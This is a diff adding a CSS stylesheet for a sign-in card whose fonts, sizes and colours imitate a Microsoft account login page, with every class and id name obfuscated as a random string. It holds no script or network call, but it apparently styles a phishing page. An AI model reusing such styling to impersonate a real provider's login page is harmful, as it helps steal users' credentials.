@@ -1,0 +1,172 @@
+html, body{
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    font-weight: 400;
+    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+    font-size: 0.9375rem;
+}
+
+*, * a{
+    list-style: none;
+    text-decoration: none;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+.q7n4v8r2t1_992211{
+    height: 100%;
+    width: 100%;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.b5h3d9s8l2_992211{
+    height: 100%;
+    width: 100%;
+    position: absolute;
+    top: 0;
+    right: 0;
+}
+
+.b5h3d9s8l2_992211 img{
+    width: 100%;
+    height: 100%;
+}
+
+.c8j2f6w9z4_992211{
+    position: relative;
+    width: calc(100% - 40px);
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+
+.d3k7u1y5x8_992211 img{
+    width: 170px;
+}
+
+.e6p4m2q9r7_992211{
+    width: 100%;
+    background: #fff;
+    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
+    padding: 44px;
+    margin-top: 20px;
+    position: relative;
+    height: 350px;
+}
+
+.f1t8v3n6b5_992211{
+    width: 100%;
+}
+
+.g9w2s4h7k1_992211{
+    font-size: 16px;
+    line-height: 24px;
+    text-overflow: ellipsis;
+    margin: 20px 0;
+    color: #404040;
+}
+
+.i6n2b8v4c3_992211{
+    padding: 0 !important;
+}
+
+.j5k9d3l7s1_992211{
+    border-bottom: 1px solid #404040;
+    width: 100%;
+    padding: 10px 0;
+    margin-top: 10px;
+    position: relative;
+}
+
+.u2y7t1r4e9_992211{
+    border-bottom: 1px solid red;
+}
+
+.j5k9d3l7s1_992211:focus-within{
+    border-bottom: 1px solid rgb(0, 103, 184);
+}
+
+.j5k9d3l7s1_992211 input{
+    width: 100%;
+    border: none;
+    font-size: 16px;
+}
+
+.j5k9d3l7s1_992211 input:focus{
+    outline: none;
+}
+
+#m7n2b5v8c1_992211{
+    position: absolute;
+    bottom: -20px;
+    left: 0;
+    width: 100%;
+    color: red;
+    display: none;
+}
+
+.k3l8p2o7i4_992211{
+   margin-top: 15px;
+}
+
+.btn-primary{
+    border-radius: 0 !important;
+}
+
+.l9q1w4e7r2_992211{
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 20px;
+    width: 100%;
+}
+
+.l9q1w4e7r2_992211 a{
+    padding-left: 30px;
+    padding-right: 30px;
+    font-weight: 600;
+    font-weight: 16px;
+}
+
+.t5r8e2w1q9_992211{
+    cursor: not-allowed;
+    opacity: 0.5;
+    display: flex;
+    align-items: center;
+    column-gap: 15px;
+}
+
+#z6x2c9v4b1_992211{
+    display: none;
+}
+
+.h4r7m1p9q2_992211{
+    width: 100%;
+    left: 0;
+    position: absolute;
+    padding:0 44px 44px 44px;
+    animation-name: y7u4i1o9p2_992211;
+    transition-property: left;
+    animation-fill-mode: both;
+    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
+    animation-duration: 0.25s;
+}
+
+@keyframes y7u4i1o9p2_992211{
+    0% {
+        left: 200px;
+        opacity: 0;
+    }
+
+    100% {
+        left: 0px;
+        opacity: 1;
+    }
+}
